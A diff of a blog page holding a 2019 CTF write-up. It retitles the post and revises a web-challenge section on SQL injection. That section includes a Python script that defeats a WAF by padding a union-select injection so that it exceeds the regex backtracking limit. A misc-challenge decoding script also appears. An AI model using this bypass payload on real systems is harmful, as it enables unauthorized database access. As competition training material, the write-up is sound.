@@ -128,7 +128,7 @@
 
 <meta name="description" content="总结总结，好多新的知识点以前没学到">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2019天安杯wp">
+<meta property="og:title" content="2019河南省“天安杯” wp">
 <meta property="og:url" content="www.gtfly.top/2019/08/29/2019天安杯wp/index.html">
 <meta property="og:site_name" content="gtfly">
 <meta property="og:description" content="总结总结，好多新的知识点以前没学到">
@@ -146,9 +146,9 @@
 <meta property="og:image" content="https://imgur.com/e7Bd9iP.png">
 <meta property="og:image" content="https://imgur.com/hdq96Xs.png">
 <meta property="og:image" content="https://imgur.com/HIhp4Fk.png">
-<meta property="og:updated_time" content="2019-08-30T08:29:34.359Z">
+<meta property="og:updated_time" content="2019-08-31T13:20:50.184Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2019天安杯wp">
+<meta name="twitter:title" content="2019河南省“天安杯” wp">
 <meta name="twitter:description" content="总结总结，好多新的知识点以前没学到">
 <meta name="twitter:image" content="https://imgur.com/bAnbujm.png">
 
@@ -197,7 +197,7 @@
     })();
 </script>
 
-  <title>2019天安杯wp | gtfly</title>
+  <title>2019河南省“天安杯” wp | gtfly</title>
   
 
 
@@ -399,7 +399,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">2019天安杯wp</h1>
+          <h1 class="post-title" itemprop="name headline">2019河南省“天安杯” wp</h1>
         
 
         <div class="post-meta">
@@ -427,8 +427,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-08-30T16:29:34+08:00">
-                2019-08-30
+              <time title="更新于" itemprop="dateModified" datetime="2019-08-31T21:20:50+08:00">
+                2019-08-31
               </time>
             
           </span>
@@ -574,13 +574,12 @@ CMD [&quot;/start.sh&quot;]</code></pre><p>从<code>COPY ./flag.txt /flag.txt</c
         document.location = document.location.origin + &quot;/index.php?id=&quot; + id;
       }
 &lt;/script&gt;</code></pre><p>那么尝试构造参数<code>?id=1</code>，显示<code>两个字，就干</code>，那么无疑是sql注入了；</p>
-<p>1.构造<code>?id=</code>为<code>-1</code>、<code>-</code>、 <code>%23</code>时，显示<code>Attack detected</code>；<br>2.构造参数为字符串、单双引号，返回状态码500</p>
-<p>之后尝试构造<code>?id=1 and sleep(5)</code>，显示<code>Attack detected</code></p>
-<p>然后就不会了。。查看wp，发现这道题他喵的也能用POST注入，而且绕过所利用的知识点应该是最大正则回溯限制：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.144.182.32:20007/?id='</span></span><br><span class="line"></span><br><span class="line">payload = &#123;<span class="string">'id'</span>: <span class="string">'100'</span> + <span class="string">' union/*'</span> + <span class="string">'a'</span>*<span class="number">999995</span> + <span class="string">'*/select database()'</span>&#125;</span><br><span class="line"></span><br><span class="line">s = requests.post(url, data=payload).text</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
+<p>1.构造<code>?id=</code>为<code>-1</code>、<code>-</code>、 <code>%23</code>，显示<code>Attack detected</code>；<br>2.构造参数如果不符合sql关键词的语句或使用单双引号，返回状态码500</p>
+<p>构造<code>?id=1^2</code>，显示的内容等于<code>?id=3</code>的内容，那么注入类型就是整型注入了；使用<code>order by</code>和<code>union select</code>时显示<code>Attack detected</code></p>
+<p>看wp，发现这道题他喵的也能用POST注入，而且绕过所利用的知识点应该是绕过最大正则回溯限制：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.144.182.32:20007/?id='</span></span><br><span class="line"></span><br><span class="line">payload = &#123;<span class="string">'id'</span>: <span class="string">'100'</span> + <span class="string">' union/*'</span> + <span class="string">'a'</span>*<span class="number">1000000</span> + <span class="string">'*/select database()'</span>&#125;</span><br><span class="line"></span><br><span class="line">s = requests.post(url, data=payload).text</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
 
 <p>当使用上述payload进行GET注入时，会显示<code>The requested URL&#39;s length exceeds the capacity limit for this server.</code></p>
-<p>当把<code>999995</code>改为<code>999994</code>时，会显示<code>Attack detected</code></p>
 <h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>challenge.txt:</p>
 <pre><code>a  aa a a aa  a a  a a  a a a a a  aa   a a a a a   aa  a aa  a a a      aaaa a a   aa  a aa  a a aa  a  aa  aa a  a a  a a aaa a  aaa   aa  a  a     a  aaaa a a a a   a a a   a a aa  a a a   a  a    a a  aa a a aaa a  aa    aaaa a  aaaa a a a aa  a a aaa a a aa  a  a aa a   a a  aa a a a a  aa a    aa  aaaa a  aaaa a</code></pre><p>将a转为1，空格转为0，再转str：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'challenge.txt'</span>, <span class="string">'r'</span>).read()</span><br><span class="line"><span class="comment">#print(f)</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">	<span class="keyword">if</span> i == <span class="string">'a'</span>:</span><br><span class="line">		s += <span class="string">'1'</span></span><br><span class="line">	<span class="keyword">elif</span> i == <span class="string">' '</span>:</span><br><span class="line">		s += <span class="string">'0'</span></span><br><span class="line"></span><br><span class="line">h = long_to_bytes(int(s, <span class="number">2</span>))</span><br><span class="line">print(h)</span><br></pre></td></tr></table></figure>
@@ -691,7 +690,7 @@ test.pdf</code></pre><p>需要密码才能查看里面的内容，猜测伪加�
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="www.gtfly.top/2019/08/29/2019天安杯wp/" title="2019天安杯wp">www.gtfly.top/2019/08/29/2019天安杯wp/</a>
+    <a href="www.gtfly.top/2019/08/29/2019天安杯wp/" title="2019河南省“天安杯” wp">www.gtfly.top/2019/08/29/2019天安杯wp/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
